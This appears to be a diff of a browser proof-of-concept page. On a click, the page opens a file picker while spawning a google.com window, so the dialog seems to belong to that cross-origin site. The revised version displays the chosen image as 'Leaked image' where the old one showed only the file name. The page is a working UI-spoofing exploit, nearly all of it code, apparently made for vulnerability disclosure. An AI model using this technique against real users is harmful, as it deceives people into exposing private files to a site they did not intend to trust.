@@ -1,37 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <title>PoC</title>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-        <script>
-            onclick = async () => {
-                (async () => {
-                    try {
-                        let [fileHandle] = await window.showOpenFilePicker({
-                            types: [{
-                                description: "Images",
-                                accept: { "image/*": [".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp"] }
-                            }]
-                        });
-                        let file = await fileHandle.getFile();
-                        document.write(`
-                            <h1>
-                                <font color="red">Leaked information:</font> ${file.name}
-                            </h1>
-                        `);
-                    } catch (error) {
-                        console.error("File selection cancelled or failed", error);
-                    }
-                })();
-                open("https://www.google.com", "PoC", "_blank");
-            }
-        </script>
-    </head>  
-    <body>
-        <br><br><br>
-        <center>
-            <h1>Click anywhere on the page to show the File Picker dialog over a cross-origin page!</h1>
-        </center>
-    </body>
+<head>
+    <title>PoC</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <script>
+        onclick = async () => {
+            (async () => {
+                try {
+                    let [fileHandle] = await window.showOpenFilePicker({
+                        types: [{
+                            description: "Images",
+                            accept: { "image/*": [".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp"] }
+                        }]
+                    });
+                    let file = await fileHandle.getFile();
+                    let imageURL = URL.createObjectURL(file);
+                    document.write(`
+                        <h1><font color="red">Leaked image:</font></h1>
+                        <img src="${imageURL}" style="max-width: 100%; max-height: 80vh;" />
+                    `);
+                } catch (error) {
+                    console.error("File selection cancelled or failed", error);
+                }
+            })();
+            open("https://www.google.com", "PoC", "_blank");
+        }
+    </script>
+</head>  
+<body>
+    <br><br><br>
+    <center>
+        <h1>Click anywhere on the page to show the File Picker dialog over a cross-origin page!</h1>
+    </center>
+</body>
 </html>
